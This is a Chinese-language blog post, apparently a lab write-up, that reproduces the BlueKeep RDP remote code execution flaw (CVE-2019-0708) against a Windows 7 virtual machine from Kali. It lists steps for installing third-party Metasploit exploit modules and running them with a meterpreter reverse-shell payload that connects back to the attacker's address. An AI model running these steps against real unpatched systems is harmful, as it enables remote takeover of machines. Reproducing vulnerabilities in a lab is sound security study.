# CVE-2019-0708 RCE 复现 - 浅笑 996 - 博客园

> 原文：[`www.cnblogs.com/qianxiao996/p/13574576.html`](https://www.cnblogs.com/qianxiao996/p/13574576.html)

# 漏洞环境

*   192.168.91.136     windows7 6.1.7601
*   192.168.91.151      kali

**Windows7 SP1 下载链接:**

ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/

# 复现过程

### 1、首先升级 MSF

```
apt-get update
apt-get install metasploit-framework
```

### 2、导入脚本

然后下载 RCE 脚本，直接将下载下载的脚本放到对应的目录下

```
rdp.rb -> /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/rdp.rb 
rdp_scanner.rb -> /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb 
cve_2019_0708_bluekeep.rb -> /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb 
cve_2019_0708_bluekeep_rce.rb -> /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb
```

下载地址：

[`github.com/NAXG/cve_2019_0708_bluekeep_rce`](https://github.com/NAXG/cve_2019_0708_bluekeep_rce)

### 3、重新加载脚本

```
msfconsole 
reload_all
```

![](https://blog.qianxiao996.cn/wp-content/uploads/2019/09/1-1.png)

### 4、攻击

使用 set RHOSTS 受害机 IP 设置受害机 IP

使用 set RPORT 受害机 PORT 设置受害机 RDP 端口号

使用 set target ID 数字(可选为 0-4)设置受害机机器架构

lhost 一般不用设置，payload 一定要设置

```
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce 
set lhost 192.168.91.151 
set rhost 192.168.91.136 
set payload windows/x64/meterpreter/reverse_tcp 
set target 1 
run
```

![](https://blog.qianxiao996.cn/wp-content/uploads/2019/09/2.jpeg)

![](https://blog.qianxiao996.cn/wp-content/uploads/2019/09/3-1.png)

目前这个 exp 仅适用于 windows7 6.1.7601   windows 2008r2

# END